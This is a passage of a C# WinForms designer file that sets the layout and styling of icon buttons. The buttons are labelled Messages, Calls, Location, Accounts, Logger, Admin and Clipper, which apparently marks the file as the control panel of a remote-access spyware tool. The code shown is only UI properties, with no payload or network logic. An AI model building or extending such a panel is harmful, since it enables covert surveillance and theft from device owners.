            this.drakeUIButtonIcon27.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon27.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon27.Size = new System.Drawing.Size(119, 53);
            this.drakeUIButtonIcon27.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon27.Symbol = 61819;
            this.drakeUIButtonIcon27.SymbolSize = 30;
            this.drakeUIButtonIcon27.TabIndex = 56;
            this.drakeUIButtonIcon27.Text = "Applications";
            this.drakeUIButtonIcon27.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon27.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon27.Click += new System.EventHandler(this.drakeUIButtonIcon27_Click);
            // 
            // drakeUIButtonIcon25
            // 
            this.drakeUIButtonIcon25.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon25.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon25.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon25.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon25.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon25.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon25.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon25.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon25.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon25.Location = new System.Drawing.Point(-109, 196);
            this.drakeUIButtonIcon25.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon25.Name = "drakeUIButtonIcon25";
            this.drakeUIButtonIcon25.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon25.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon25.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon25.Size = new System.Drawing.Size(119, 53);
            this.drakeUIButtonIcon25.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon25.Symbol = 57449;
            this.drakeUIButtonIcon25.SymbolSize = 30;
            this.drakeUIButtonIcon25.TabIndex = 58;
            this.drakeUIButtonIcon25.Text = "Volume high";
            this.drakeUIButtonIcon25.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon25.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon25.Click += new System.EventHandler(this.drakeUIButtonIcon25_Click);
            // 
            // drakeUIButtonIcon24
            // 
            this.drakeUIButtonIcon24.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon24.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon24.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon24.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon24.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon24.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon24.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon24.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon24.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon24.Location = new System.Drawing.Point(-104, 122);
            this.drakeUIButtonIcon24.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon24.Name = "drakeUIButtonIcon24";
            this.drakeUIButtonIcon24.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon24.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon24.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon24.Size = new System.Drawing.Size(105, 53);
            this.drakeUIButtonIcon24.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon24.Symbol = 61683;
            this.drakeUIButtonIcon24.SymbolSize = 30;
            this.drakeUIButtonIcon24.TabIndex = 59;
            this.drakeUIButtonIcon24.Text = "Notifications";
            this.drakeUIButtonIcon24.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon24.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon24.Click += new System.EventHandler(this.drakeUIButtonIcon24_Click);
            // 
            // drakeUIButtonIcon23
            // 
            this.drakeUIButtonIcon23.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon23.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon23.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon23.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon23.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon23.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon23.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon23.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon23.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon23.Location = new System.Drawing.Point(128, 124);
            this.drakeUIButtonIcon23.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon23.Name = "drakeUIButtonIcon23";
            this.drakeUIButtonIcon23.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon23.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon23.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon23.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon23.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon23.Symbol = 61664;
            this.drakeUIButtonIcon23.SymbolSize = 30;
            this.drakeUIButtonIcon23.TabIndex = 60;
            this.drakeUIButtonIcon23.Text = "Messages";
            this.drakeUIButtonIcon23.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon23.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon23.Click += new System.EventHandler(this.drakeUIButtonIcon23_Click);
            // 
            // drakeUIButtonIcon22
            // 
            this.drakeUIButtonIcon22.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon22.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon22.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon22.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon22.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon22.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon22.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon22.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon22.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon22.Location = new System.Drawing.Point(147, 54);
            this.drakeUIButtonIcon22.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon22.Name = "drakeUIButtonIcon22";
            this.drakeUIButtonIcon22.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon22.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon22.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon22.Size = new System.Drawing.Size(45, 53);
            this.drakeUIButtonIcon22.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon22.Symbol = 61589;
            this.drakeUIButtonIcon22.SymbolSize = 30;
            this.drakeUIButtonIcon22.TabIndex = 61;
            this.drakeUIButtonIcon22.Text = "Calls";
            this.drakeUIButtonIcon22.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon22.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon22.Click += new System.EventHandler(this.drakeUIButtonIcon22_Click);
            // 
            // drakeUIButtonIcon33
            // 
            this.drakeUIButtonIcon33.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon33.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon33.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon33.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon33.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon33.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon33.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon33.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon33.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon33.Location = new System.Drawing.Point(328, 267);
            this.drakeUIButtonIcon33.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon33.Name = "drakeUIButtonIcon33";
            this.drakeUIButtonIcon33.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon33.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon33.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon33.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon33.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon33.Symbol = 61946;
            this.drakeUIButtonIcon33.SymbolSize = 30;
            this.drakeUIButtonIcon33.TabIndex = 62;
            this.drakeUIButtonIcon33.Text = "Accounts";
            this.drakeUIButtonIcon33.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon33.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon33.Click += new System.EventHandler(this.drakeUIButtonIcon33_Click);
            // 
            // drakeUIButtonIcon17
            // 
            this.drakeUIButtonIcon17.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon17.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon17.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon17.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon17.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon17.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon17.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon17.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon17.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon17.Location = new System.Drawing.Point(116, 350);
            this.drakeUIButtonIcon17.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon17.Name = "drakeUIButtonIcon17";
            this.drakeUIButtonIcon17.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon17.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon17.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon17.Size = new System.Drawing.Size(85, 53);
            this.drakeUIButtonIcon17.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon17.Symbol = 61965;
            this.drakeUIButtonIcon17.SymbolSize = 30;
            this.drakeUIButtonIcon17.TabIndex = 81;
            this.drakeUIButtonIcon17.Text = "Logger";
            this.drakeUIButtonIcon17.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon17.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon17.Click += new System.EventHandler(this.drakeUIButtonIcon17_Click_1);
            // 
            // drakeUIButtonIcon31
            // 
            this.drakeUIButtonIcon31.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon31.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon31.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon31.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon31.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon31.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon31.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon31.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon31.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon31.Location = new System.Drawing.Point(339, 124);
            this.drakeUIButtonIcon31.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon31.Name = "drakeUIButtonIcon31";
            this.drakeUIButtonIcon31.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon31.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon31.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon31.Size = new System.Drawing.Size(61, 53);
            this.drakeUIButtonIcon31.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon31.Symbol = 61746;
            this.drakeUIButtonIcon31.SymbolSize = 30;
            this.drakeUIButtonIcon31.TabIndex = 64;
            this.drakeUIButtonIcon31.Text = "Admin";
            this.drakeUIButtonIcon31.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon31.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon31.Click += new System.EventHandler(this.drakeUIButtonIcon31_Click);
            // 
            // drakeUIButtonIcon30
            // 
            this.drakeUIButtonIcon30.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon30.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon30.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon30.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon30.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon30.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon30.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon30.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon30.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon30.Location = new System.Drawing.Point(19, 196);
            this.drakeUIButtonIcon30.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon30.Name = "drakeUIButtonIcon30";
            this.drakeUIButtonIcon30.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon30.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon30.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon30.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon30.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon30.Symbol = 61505;
            this.drakeUIButtonIcon30.SymbolSize = 30;
            this.drakeUIButtonIcon30.TabIndex = 65;
            this.drakeUIButtonIcon30.Text = "Location";
            this.drakeUIButtonIcon30.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon30.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon30.Click += new System.EventHandler(this.drakeUIButtonIcon30_Click);
            // 
            // drakeUIButtonIcon29
            // 
            this.drakeUIButtonIcon29.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon29.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon29.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon29.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon29.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon29.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon29.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon29.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon29.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon29.Location = new System.Drawing.Point(327, 350);
            this.drakeUIButtonIcon29.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon29.Name = "drakeUIButtonIcon29";
            this.drakeUIButtonIcon29.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon29.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon29.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon29.Size = new System.Drawing.Size(77, 53);
            this.drakeUIButtonIcon29.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon29.Symbol = 57446;
            this.drakeUIButtonIcon29.SymbolSize = 30;
            this.drakeUIButtonIcon29.TabIndex = 66;
            this.drakeUIButtonIcon29.Text = "Toast";
            this.drakeUIButtonIcon29.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon29.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon29.Click += new System.EventHandler(this.drakeUIButtonIcon29_Click);
            // 
            // drakeUIButtonIcon28
            // 
            this.drakeUIButtonIcon28.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon28.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon28.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon28.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon28.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon28.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon28.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon28.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon28.ImageAlign = System.Drawing.ContentAlignment.TopCenter;
            this.drakeUIButtonIcon28.Location = new System.Drawing.Point(328, 196);
            this.drakeUIButtonIcon28.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUIButtonIcon28.Name = "drakeUIButtonIcon28";
            this.drakeUIButtonIcon28.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon28.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon28.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon28.Size = new System.Drawing.Size(83, 53);
            this.drakeUIButtonIcon28.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon28.Symbol = 61786;
            this.drakeUIButtonIcon28.SymbolSize = 30;
            this.drakeUIButtonIcon28.TabIndex = 67;
            this.drakeUIButtonIcon28.Text = "Clipper";
            this.drakeUIButtonIcon28.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.drakeUIButtonIcon28.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon28.Click += new System.EventHandler(this.drakeUIButtonIcon28_Click);
            // 
            // drakeUIButtonIcon4
            // 
            this.drakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon4.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon4.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon4.ForePressColor = System.Drawing.Color.Lime;
